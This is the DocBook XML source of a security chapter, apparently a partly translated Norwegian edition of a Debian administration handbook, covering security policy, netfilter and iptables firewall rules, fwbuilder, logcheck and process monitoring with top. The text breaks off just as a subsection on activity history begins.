<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Brannmur</keyword>
      <keyword>Nettfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Sikkerhet</title>
  <highlights>
    <para>Et informasjonssystem kan ha en varierende viktighet som følge av miljøfaktorer. Noen ganger kan det være livsviktig for bedriftens overlevelse, og må derfor beskyttes mot forskjellige former for risiko. Prosessen med å evaluere disse risikoene, definere og implementere beskyttelsesmekanismer kalles med et fellesord «sikkerhetsprosessen».</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Å definere et sikkerhetsopplegg</title>

    <sidebar>
      <title><emphasis>VÆR VARSOM</emphasis> Hensikten/omfanget med dette kapittelet</title>

      <para>Datasikkerhet (eng: security) er et stort og følsomt tema, som ikke på langt nær kan beskrives fullstendig i bare ett kapittel. Vi vil bare framheve noen få viktige punkter, og beskrive noen av verktøyene og metodene som kan nyttes på dette feltet. For videre lesning mangler det ikke på bøker øremerket til temaet. Et godt sted å starte kan være <citetitle>Linux Server Security</citetitle> av Michael D. Bauer (publisert av O'Reilly).</para>
    </sidebar>

    <para>Ordet «sikkerhet» dekker et vidt spekter av konsepter, verktøy, og prosedyrer; ingen av dem dekker alle aspekter. Å velge mellom dem krever en presis ide om hvilke mål man vil oppnå. Å sikre et system starter med å svare på noen få spørsmål. Raser man avgårde, og implementerer et vilkårlig sett av tiltak, risikerer man å fokusere på feil ting.</para>

    <para>Den absolutt første tingen å avgjøre er derfor målet. En god tilnærming til å hjelpe til med denne avgjørelsen er å starte med disse spørsmålene:</para>
    <itemizedlist>
      <listitem>
	<para><emphasis>Hva</emphasis> prøver man å beskytte? Sikkerhetsopplegget vil være forskjellig avhengig om man vil beskytte maskiner eller data. I sistnevnte tilfelle må vi også vite hvilke data.</para>
      </listitem>
      <listitem>
	<para>Hva prøver vi å beskytte <emphasis>mot</emphasis>? Er det lekkasje av sensitive data? Tap av data? Tap av inntekt som følge av forstyrrelser i tjenesten?</para>
      </listitem>
      <listitem>
	<para>Dessuten, <emphasis>hvem</emphasis> prøver vi vi å beskytte mot? Sikkerhetstiltakene vil variere stort mellom det å beskytte mot skrivefeil fra brukeren av systemet, og angrep fra motiverte grupper utenfra.</para>
      </listitem>
    </itemizedlist>

    <para>Ordet «risiko», i sikkerhetsøyemed, brukes gjerne som samlebegrep for disse tre faktorene: Hva som må beskyttes, hva som må hindres fra å skje, og hvem som det må beskyttes mot. Å modellere risikoen krever svar på disse tre spørsmålene. Utfra en slik risikomodell kan et sikkerhetsopplegg konstrueres, og dette kan implementeres gjennom konkrete tiltak.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Permanent questioning</title>

      <para>Bruce Schneier, en verdenskjent sikkerhetsekspert (ikke bare på datasikkerhet), prøver å avlive en av de største mytene innen sikkerhet ved å si: «Sikkerhet er en prosess, ikke et produkt». Verdier som må beskyttes endrer seg over tid; det samme gjør truslene og tilgjengelige ressurser for mulige angripere. Selv om et sikkerhetsopplegg opprinnelig er perfekt konstruert og implementert, kan man ikke hvile på sine laurbær. Risikomomentene endrer seg, og da må tiltakene henge med.</para>
    </sidebar>

    <para>Andre begrensninger er også verdt å tenke på, ettersom de kan sette grenser for tilgjengelig sikkerhetsopplegg. Hvor langt er man villig til å gå for å sikre systemet? Dette spørsmålet har store konsekvenser for hva som skal implementeres. Det besvares altfor ofte kun utfra økonomi, selv om andre kriterier også bør tas i betraktning, som ulemper som påføres brukeren, og tap av ytelse.</para>

    <para>Once the risk has been modeled, one can start thinking about
    designing an actual security policy.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Ekstrem politikk</title>

      <para>Det er tilfeller hvor valget av tiltak som kreves for å sikre et system er ekstremt enkle.</para>

      <para>For eksempel, hvis systemet som skal sikres bare består av en gammel brukt maskin, med sitt ene formål å legge sammen noen tall på slutten av dagen, ville det antakelig være helt legitimt å ikke gjøre noen ting - verdien som ligger i systemet er lav, og det er ingen verdi i dataene, ettersom de ikke lagres på maskinen. En potensiell angriper ville bare få tilgang til en uhåndterlig kalkulator. Kostnaden ved å sikre et slikt system ville sannsynligvis oppveie kostnaden av et eventuelt tap/brudd.</para>

      <para>I motsatt ende av spekteret, hvis konfidensialitet av hemmelige data trumfer alle andre hensyn, vil en riktig respons kunne være å destruere dataene så grundig som mulig (overskriving, sletting av dataene mange ganger, for så å løse harddisken opp i syrebad, osv). Hvis det i tillegg kreves at dataene skal oppbevares for framtidig bruk (ikke nødvendigvis på kort varsel), og kostnad fortsatt ikke er en faktor, vil et hensiktsmessig startpunkt være å lagre dataene på plater av en iridium-platinum-legering i bombesikre bunkere under forskjellige fjell omkring i verden, alle selvsagt både hemmelige og bevoktede med hver sin hær …</para>

      <para>Ekstreme som de er, disse eksemplene ville være adekvate responser for sine definerte risikoer, i den grad de er produktet av en tankeprosess som har tatt hensyn til målene som skal oppnås, og begrensningene som må oppfylles. Så lenge den kommer fra en velinformert rasjonell beslutning, er intet sikkerhetsopplegg mindre respektabelt enn et annet.</para>
    </sidebar>

    <para>I de fleste tilfeller kan informasjonssystemet segmenteres i konsistente og stort sett uavhengige subsett. Hvert subsystem vil ha sine egne krav og begrensninger, så risikovurderingen og utformingen av sikkerhetsopplegget bør gjøres separat for hvert subsystem. Et godt prinsipp å huske på er at en kort og veldefinert forsvarslinje er enklere å forsvare enn en lang og buktende en. Nettverksorganisasjonen bør også utformes tilsvarende; sensitive tjenester bør konsentreres på et lite antall maskiner, og disse maskinene bør bare være tilgjengelige via et minimalt antall innfallsporter; beskytting av disse innfallsportene vil være enklere enn å beskytte alle de sensitive maskinene mot den store utenomverdenen. Det er her nettverksfiltrering (inkludert brannmurer) kommer inn. Denne filtreringen kan implementeres med dedikert maskinvare, men en mulig enklere og mer fleksibel løsning er å bruke en programvarebrannmur, som den som er integrert i Linux-kjernen.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Brannmur eller pakkefiltrering</title>
    <indexterm><primary>brannmur</primary></indexterm>
    <indexterm><primary>pakkefilter</primary></indexterm>

    <sidebar>
      <title><emphasis>DET GRUNNLEGGENDE</emphasis> Brannmur</title>
      <indexterm><primary>pakke</primary><secondary>IP</secondary></indexterm>

      <para>En <emphasis>brannmur</emphasis> er et stykke datautstyr med maskinvare og/eller programvare som sorterer innkommende og utgående nettverkspakker (som kommer til eller fra et lokalt nettverk), og bare slipper gjennom de som samsvarer med visse forhåndsbestemte betingelser.</para>
    </sidebar>

    <para>En brannmur er en nettverksport for filtrering, og er bare effektiv på pakker som må gå gjennom den. Den kan derfor bare være effektiv når den eneste ruten for disse pakkene er gjennom brannmuren.</para>

    <para>Mangelen på en standard konfigurasjon (og «prosess, ikke produkt»-mottoet) forklarer mangelen av en nøkkelferdig løsning. Det fins derimot verktøy som gjør det enklere å konfigurere <emphasis>nettfilter</emphasis>-brannmuren, med en grafisk representasjon av filterreglene. <command>fwbuilder</command> er utvilsomt blant de beste av dem.</para>
    <indexterm><primary><emphasis>nettfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>SPECIFIC CASE</emphasis> Local Firewall</title>

      <para>En brannmur kan begrenses til en bestemt maskin (til forskjell fra et helt nettverk), i så fall for å filtrere eller begrense adgang til noen tjenester, eller muligens hindre utgående forbindelser fra ondsinnede programmer som brukeren kunne, med vilje eller ei, ha installert.</para>
    </sidebar>

    <para>Linux-kjernen inneholder <emphasis>nettfilter</emphasis>-brannmuren. Den kan kontrolleres fra brukerrommet med kommandoene <command>iptables</command> og <command>ip6tables</command>. Forskjellen mellom disse er at den første betjener IPv4-nettverket, mens den siste betjener IPv6. Siden begge nettverksprotokollene sannsynligvis vil fortsette å eksistere i årevis, vil begge verktøyene måtte brukes i parallell.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Netfilter Behavior</title>

      <para><emphasis>nettfilter</emphasis> bruker fire forskjellige tabeller for regler om tre typer pakkeoperasjoner:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal> for filterregler (akseptere, nekte, ignorere en pakke)</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> for oversetting av kilde- eller destinasjonsadresser og porter på pakker;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> for andre endringer av IP-pakker (inkludert ToS-felt og -opsjoner (Type of Service));</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> tillater andre manuelle modifikasjoner av pakker før de når forbindelsessporingssystemet.</para>
        </listitem>
      </itemizedlist>

      <para>Hver tabell inneholder en liste av regler kalt <emphasis>kjeder</emphasis>. Brannmuren bruker standardkjeder til å håndtere pakker basert på predefinerte betingelser. Administratoren kan lage andre kjeder, som bare vil bli brukt når den refereres til av noen av standardkjedene (direkte eller indirekte).</para>
      <indexterm><primary>kjede</primary></indexterm>
      <indexterm><primary>filterregel</primary></indexterm>

      <para><literal>filter</literal> tabellen har tre standardkjeder:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>: gjelder pakker der destinasjon er brannmuren selv;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: gjelder pakker som er sendt ut fra brannmuren;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>: gjelder pakker i transitt gjennom brannmuren (som verken er kilden eller destinasjon deres).</para>
        </listitem>
      </itemizedlist>

      <para>Tabellen <literal>nat</literal> har også tre standardkjeder:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>: å endre pakker så snart de ankommer;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>: å modifisere pakker når de er klare til utsendelse;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: å modifisere pakker som genereres av selve brannmuren.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Hvordan <emphasis>nettfilter</emphasis>-kjeder påkalles</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Hver kjede er en liste med regler; hver regel er et sett av betingelser og en handling som skal utføres når vilkårene er oppfylt. Ved behandling av en pakke, skanner brannmur den riktige kjeden, en regel etter den andre; når vilkårene for en regel er oppfylt, «hopper» det (derav <literal>-j</literal>-alternativet i kommandoene) til det angitte tiltak for å fortsette prosessen. De vanligste handlingene er standardisert, med foreliggende øremerkede handlinger. Å ta én av disse standardhandlingene forstyrrer prosessen for kjeden, fordi pakkens skjebne allerede er fastsatt (bortsett fra unntaket som er nevnt nedenfor):</para>

      <sidebar>
        <title><emphasis>DET GRUNNLEGGENDE</emphasis> ICMP</title>

	<para>ICMP (<emphasis>Internet Control Message </emphasis>Protocol) er protokollen som brukes til å overføre utfyllende informasjon om kommunikasjon. Den tillater å teste nettverkstilkobling med <command>ping</command>-kommandoen (som sender et ICMP <emphasis>echo request </emphasis>-budskap, som det er ment at mottakeren skal svare med et ICMP <emphasis>echo reply</emphasis>-budskap). Det signaliserer at en brannmur avviser en pakke, indikerer at en mottaksbuffer er overfylt, foreslår en bedre rute for de neste pakkene i forbindelsen, og så videre. Denne protokollen er definert i flere RFC-dokumenter; de opprinnelige RFC777 og RFC792 ble snart fullført og utvidet. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>For referanse: En mottaksbuffer er en liten minnesone som lagrer data fra den tiden den kommer fra nettverket, og til den tid kjernen håndterer den. Hvis denne sonen er full, kan nye data ikke mottas, og ICMP signaliserer problemet, slik at senderen kan bremse ned sin overføringshastighet (som ideelt sett  bør nå en likevekt etter en tid).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>mottaksbuffer </primary></indexterm>
        <indexterm><primary>buffer</primary><secondary>mottaksbuffer</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Merk at selv om et IPv4-nettverk kan fungere uten ICMP, er ICMPv6 strengt nødvendig for et IPv6-nettverk, siden det kombinerer flere funksjoner som var i IPv4-verdenen, spredt over ICMPv4, IGMP( <emphasis>Internet Group Membership Protocol</emphasis>) og ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 er definert i RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: tillater pakken å fortsette på sin vei;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>: avviser pakken med en ICMP-feilpakke (<literal>--reject-with <replaceable>type</replaceable></literal>-valget til <command>iptables</command> tillater å velge typen feil);</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: slette (ignorere) pakken;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: logg (via <command>syslogd</command>) en melding med en beskrivelse av pakken. Merk at denne handlingen ikke avbryter prosessen, og kjøringen av kjeden fortsetter med den neste regelen, som er grunnen til at logging av avslåtte pakker krever både en LOG-regel og en REJECT/DROP-regel;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: logger et budskap via <command>ulogd</command>, som kan tilpasses bedre og mer effektivt enn <command>syslogd</command> for håndtering av et stort antall meldinger. Merk at denne handlingen, slik som LOG, også returnerer prosessen til den neste regelen i påkallingskjeden;</para>
        </listitem>
        <listitem>
	  <para><replaceable>chain_name</replaceable>: jump to the given
	  chain and evaluate its rules;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: avbryter prosessen til den gjeldende kjeden, og går tilbake til den anropende kjeden; i tilfelle den aktuelle kjeden er standard, er det ingen påkallingskjede, slik at standardhandlingen (definert med <literal>-P</literal>-valget til <command>iptables</command>) kjøres i stedet;</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (only in the
	  <literal>nat</literal> table): apply
	  <emphasis>Source NAT</emphasis> (extra options describe the
	  exact changes to apply);</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (only in the
	  <literal>nat</literal> table): apply
	  <emphasis>Destination NAT</emphasis> (extra options describe
	  the exact changes to apply);</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (bare i <literal>nat</literal>-tabellen): bruk <emphasis>maske (masquerading)</emphasis> (et spesialtilfelle av <emphasis>Source NAT (kilde NAT)</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (bare i <literal>nat</literal>-tabellen): å omdirigere en pakke til en gitt port i brannmuren selv. Denne kan brukes til å sette opp en gjennomsiktig nettmellomtjener som fungerer uten konfigurasjon på klientsiden, siden klienten tror den kobles til mottakeren, mens kommunikasjonen faktisk gå gjennom mellomtjeneren.</para>
        </listitem>
      </itemizedlist>

      <para>Andre handlinger, spesielt dem som gjelder <literal>mangle</literal>-tabellen, er utenfor formålet med teksten her. <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> og <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> har en omfattende liste.</para>
    </section>
    <section id="sect.iptables">
      <title>Syntaksen til <command>iptables</command> og <command>ip6tables</command></title>

      <para>Kommandoene <command>iptables</command> og <command>ip6tables</command> kan håndtere tabeller, kjeder og regler. Alternativet deres <literal>-t <replaceable>tabell</replaceable></literal> indikerer hvilken tabell en kan operere fra (som standard <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Kommandoer</title>

	<para><literal>-N <replaceable>kjede</replaceable></literal>-valget lager en ny kjede. <literal>-X <replaceable>kjede</replaceable></literal> sletter en tom eller ubrukt kjede. <literal>-A <replaceable>kjede</replaceable> <replaceable>regel</replaceable></literal> legger til en regel ved slutten av en gitt kjede. <literal>-I <replaceable>kjede</replaceable> <replaceable>regel_nummer</replaceable> <replaceable>regel</replaceable></literal>-valget setter inn en regel før regelnummeret <replaceable>regel_nummer</replaceable>. <literal>-D <replaceable>kjede</replaceable> <replaceable>regel_nummer</replaceable></literal> (eller <literal>-D <replaceable>kjede</replaceable> <replaceable>regel</replaceable></literal>)-valget sletter en regel i en kjede; den første syntaksen identifiserer regelen som skal slettet ut fra nummeret den har. <literal>-F <replaceable>kjede</replaceable></literal>-alternativet tømmer en kjede (sletter alle dens regler); hvis ingen kjede er nevnt, er alle reglene i tabellen slettet. <literal>-L <replaceable>kjede</replaceable></literal>-valget lister reglene i kjeden. Til slutt, <literal>-P <replaceable>kjede</replaceable> <replaceable>handling</replaceable></literal>-valget definerer standardhandlingen, eller «policy», for en gitt kjede; Merk at bare standardkjeder kan ha en slik «policy».</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Regler</title>
        <indexterm><primary>filterregel</primary></indexterm>

	<para>Hver regel er uttrykt som <literal><replaceable>forhold</replaceable> -j <replaceable>handling</replaceable> <replaceable>handlings_alternativer</replaceable></literal>. Hvis flere betingelser er beskrevet i den samme regelen, da er kriteriet forbindelsen mellom betingelsene (logisk <emphasis>og</emphasis>), som er minst like restriktive som hver individuelle betingelse.</para>

	<para>Betingelsen <literal>-p <replaceable>protokoll</replaceable></literal> samsvarer med protokollfeltet i IP-pakken. De vanligste verdiene er <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, og <literal>icmpv6</literal>. Å forhåndsinnstille betingelsen med et utropstegn som benekter betingelsen, som deretter blir en oppgave for «noen pakker med en annen protokoll enn den spesifiserte». Denne negasjonsmekanismen er ikke spesiell for <literal>-p</literal>-alternativet, og det kan brukes på alle andre forhold også.</para>

	<para><literal>-s <replaceable>adresse</replaceable></literal> eller <literal>-s <replaceable>nettverk/maske</replaceable></literal>-betingelsen samsvarer med pakkens kildeadresse. Tilsvarende, <literal>-d <replaceable>adresse</replaceable></literal> eller <literal>-d <replaceable>nettverk/maske</replaceable></literal> samsvarer med måladressen.</para>

	<para>Betingelsen <literal>-i <replaceable>grensesnitt</replaceable></literal> velger pakker som kommer inn fra et bestemt nettverksgrensesnitt. <literal>-o <replaceable>grensesnitt</replaceable></literal> velger pakker som går ut via et spesifikt grensesnitt.</para>

	<para>Det er mer spesifikke betingelser, avhengig av de generelle betingelser som er beskrevet ovenfor. For eksempel kan <literal>-p tcp</literal>-betingelsen kompletteres med betingelser i TCP-portene, med klausuler som<literal>--source-port <replaceable>port</replaceable></literal> og <literal>--destination-port <replaceable>port</replaceable></literal>.</para>

	<para>Betingelsen <literal>--state <replaceable>tilstand (status)</replaceable></literal> samsvarer med tilstanden til en pakke i en forbindelse (dette krever kjernemodulen <command>ipt_conntrack</command> for koblingssporing). <literal>NEW</literal>-tilstanden beskriver en pakke som starter en ny forbindelse; <literal>ESTABLISHED</literal> samsvarer med pakker som tilhører en allerede eksisterende kobling, og <literal>RELATED</literal> samsvarer med pakker som initierer en ny tilkobling knyttet til en eksisterende (som er nyttig for <literal>ftp-data</literal>-forbindelsene i FTP-protokollens «aktivmodus»).</para>

	<para>Den forrige seksjonen viser tilgjengelige handlinger, men ikke de respektive alternativene.<literal>LOG</literal>-handlingen har for eksempel de følgende valgene:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal>, med standardverdi <literal>warning</literal>, indikerer alvorlighetsgraden <command>syslog</command>;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> tillater å spesifisere en tekst-forstavelse for å skille mellom loggede meldinger;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> og <literal>--log-ip-options</literal> indikerer ekstra data som skal integreres i meldingen: henholdsvis TCP-sekvensnummer, TCP-alternativer, og IP-alternativer.</para>
          </listitem>
        </itemizedlist>

	<para><literal>DNAT</literal>-handlingen gir <literal>--to-destination <replaceable>adresse</replaceable>:<replaceable>port</replaceable></literal> valget for å indikere den nye destinasjonens IP-adresse og/eller port. Tilsvarende, <literal>SNAT</literal> gir <literal>--to-source <replaceable>adresse</replaceable>:<replaceable>port</replaceable></literal> for å indikere den nye kildens IP-adresse og/eller port.</para>

	<para><literal>REDIRECT</literal>-handlingen (bare hvis NAT er tilgjengelig) gir <literal>--to-ports <replaceable>port(er)</replaceable></literal> valget for å angi porten, eller portområdet, dit pakkene skal omdirigeres.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Å lage regler</title>

      <para>Hver regeletablering krever bruk av <command>iptables</command>/<command>ip6tables</command>. Å skrive disse kommandoene manuelt kan være kjedelig, så anropene lagres vanligvis i et skript slik at den samme konfigurasjonen blir satt opp automatisk hver gang maskinen starter. Dette skriptet kan skrives for hånd, men det kan også være interessant å forberede det med et høynivå verktøy som <command>fwbuilder</command>.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>Prinsippet er enkelt. I det første trinnet må man beskrive alle elementene som involveres i selve reglene:</para>
      <itemizedlist>
        <listitem>
	  <para>brannmuren selv, med sine nettverksgrensesnitt;</para>
        </listitem>
        <listitem>
	  <para>nettverkene, med sine tilhørende IP-serier;</para>
        </listitem>
        <listitem>
	  <para>tjenerne;</para>
        </listitem>
        <listitem>
	  <para>portene som tilhører de tjenestene som ligger på tjenerne.</para>
        </listitem>
      </itemizedlist>

      <para>Reglene blir deretter laget med enkle dra-og-slipp-handlinger på objektene. Noen kontekstmenyer kan endre betingelsen (nekte den, for eksempel). Deretter må handlingen velges og konfigureres.</para>

      <para>Såvidt det gjelder IPv6, kan man enten lage to forskjellige regelsett for IPv4 og IPv6, eller bare lage ett, og la <command>fwbuilder</command> oversette reglene ifølge de adressene som er tildelt stedene.</para>

      <figure id="figure.fwbuilder">
        <title>Fwbuilders hovedvindu</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> kan deretter generere et skript som konfigurerer brannmuren etter de regler som er angitt. Dens modulære arkitektur gir det muligheten til å generere skript rettet mot ulike systemer: <command>iptables</command> for Linux, <command>ipf</command> for FreeBSD, og <command>pf</command> for OpenBSD.</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Å installere reglene ved hver oppstart</title>

      <para>I andre tilfeller er den anbefalte måten å registrere skriptet i et <literal>up</literal>-direktiv av <filename>/etc/network/interfaces</filename>-fil. I det følgende eksemplet er skriptet lagret under <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title><filename>interfaces</filename>-fil (grensesnittsfil) som påkaller et brannmursskript</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw
</programlisting>
      </example>
      <para>Dette forutsetter selvsagt at du bruker <emphasis role="pkg">ifupdown</emphasis> til å konfigurere nettverksgrensesnittet. Hvis du bruker noe annet (som <emphasis>NetworkManager</emphasis> eller <emphasis>systemd-networkd</emphasis>), henvis deretter til deres respektive dokumentasjon for å finne ut måter til å kjøre et skript, etter at grensesnittet har blitt tatt opp.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Overvåking: Forebygging, avdekking, avskrekking</title>
    <indexterm><primary>overvåkning</primary></indexterm>

    <para>Overvåking er en integrert del av ethvert sikkerhetsopplegg av flere grunner. Blant dem er at målet om sikkerhet vanligvis ikke er begrenset til å garantere datakonfidensialitet, men det inkluderer også å sikre tjenestenes tilgjengelighet. Det er derfor viktig å sjekke at alt fungerer som forventet, og å i tide oppdage avvikende atferd eller endring i kvaliteten på tjenesten(e) som blir levert. Å overvåke aktivitet kan bidra til å oppdage inntrengningsforsøk, og muliggjøre en rask reaksjon før de forårsaker alvorlige konsekvenser. Denne delen vurderer noen verktøy som kan brukes til å overvåke flere aspekter av et Debian-systemet. Som sådan, fullfører den <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Å overvåke logger med <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>logger</primary><secondary>overvåkning</secondary></indexterm>
      <indexterm><primary>overvåkning</primary><secondary>loggfiler</secondary></indexterm>

      <para>Programmet <command>logcheck</command> overvåker loggfiler som standard hver time. Det sender uvanlige loggmeldinger i e-post til administratoren for videre analyse.</para>

      <para>Listen over overvåkede filer lagres i <filename>/etc/logcheck/logcheck.logfiles</filename>; standardverdiene fungerer fint hvis <filename>/etc/rsyslog.conf</filename>-filen ikke har blitt fullstendig overhalt.</para>

      <para><command>logcheck</command> kan arbeide i en av tre mer eller mindre detaljerte modi: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> og <emphasis>arbeidsstasjon</emphasis>. Den første er <emphasis>veldig</emphasis> ordrik, og bør nok være begrenset til bestemte tjenere slike som brannmurer. Den andre (og standard) modus anbefales for de fleste tjenere. Den siste er beregnet for arbeidsstasjoner, og er mer finslipt (den filtrerer ut flere meldinger).</para>

      <para>I alle tre tilfelle bør nok <command>logcheck</command> være tilpasset for å utelukke noen ekstra meldinger (avhengig av installerte tjenester), med mindre admin virkelig hver time ønsker å motta grupper av lange uinteressante e-poster. Siden utvalgsmekanismen for meldinger er ganske komplisert, er filen <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> anbfalt lesning, men utfordrende.</para>

      <para>De anvendte reglene kan deles inn i flere typer:</para>
      <itemizedlist>
        <listitem>
	  <para>de som kvalifiserer en melding som et inntrengningsforsøk (lagret i en fil i <filename>/etc/logcheck/cracking.d/</filename>-mappen);</para>
        </listitem>
        <listitem>
	  <para>de som de avbryter slik kvalifisering (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>de som klassifiserer en melding som en sikkerhetsadvarsel (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>de som avbryter denne klassifisering (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>til slutt, de som andvendes til de gjenstående budskapene (ansett som <emphasis>systemhendelser</emphasis>).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>VÆR VARSOM</emphasis> Å ignorere et budskap</title>

	<para>Alle meldinger merket som et inntrengningsforsøk eller en sikkerhetsadvarsel (etter en regel lagret i en <filename>/etc/logcheck/violations.d/myfile</filename>-fil), kan bare ignoreres med en regel i en <filename>/etc/logcheck/violations.ignore.d/myfile</filename> eller <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>forlengelse</replaceable></filename>-fil.</para>
      </sidebar>

      <para>En systemhendelse signaliseres alltid, med mindre en regel i en av <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename>-mappene fastslår at handlingen skal ignoreres. Det er selvfølgelig at de eneste mapper som tas i betraktning, er de som tilsvarer et detaljnivået likt eller større enn den valgte driftsmodus.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Overvåkningsaktivitet</title>
      <indexterm><primary>overvåkning</primary><secondary>aktivitet</secondary></indexterm>
      <indexterm><primary>aktivitet, overvåkning</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>I sanntid</title>

	<para><command>top</command> is an interactive tool that displays a
	list of currently running processes. The default sorting is based
	on the current amount of processor use and can be obtained with the
	<keycap>P</keycap> key. Other sort orders include a sort by
	occupied memory (<keycap>M</keycap> key), by total processor time
	(<keycap>T</keycap> key) and by process identifier
	(<keycap>N</keycap> key). The <keycap>k</keycap> key allows killing
	a process by entering its process identifier. The
	<keycap>r</keycap> key allows <emphasis>renicing</emphasis> a
	process, i.e. changing its priority.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Når systemet ser ut til å være overbelastet, er <command>top</command> et flott verktøy for å se hvilke prosesser som konkurrerer om prosessortid, eller bruker for mye minne. Spesielt er det ofte interessant å sjekke om de prosesser som bruker ressurser samsvarer med reelle tjenester som maskinen er kjent for å være vert for. En ukjent prosess som kjører som www-databruker skal virkelig være synlig og undersøkes, da den sannsynligvis er et tilfelle av at programvare er installert og kjørt på systemet via en sårbarhet i en nett-applikasjon.</para>

	<para><command>top</command> er et svært fleksibelt verktøy, og den tilhørende manuelle siden informerer om hvordan man tilpasser skjermen til personlige behov og vaner.</para>

        <para><command>gnome-system-monitor</command>-grafiske verktøy ligner <command>top</command>, og gir grovt sett de samme egenskapene.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>Historie</title>
        <indexterm><primary>aktivitet, historie</primary></indexterm>

	<para>Prosessorbelastning, nettverkstrafikk og ledig diskplass er informasjon som stadig varierer. Å beholde en historie med hvordan de endres er ofte nyttig for å bestemme nøyaktig hvordan datamaskinen brukes.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

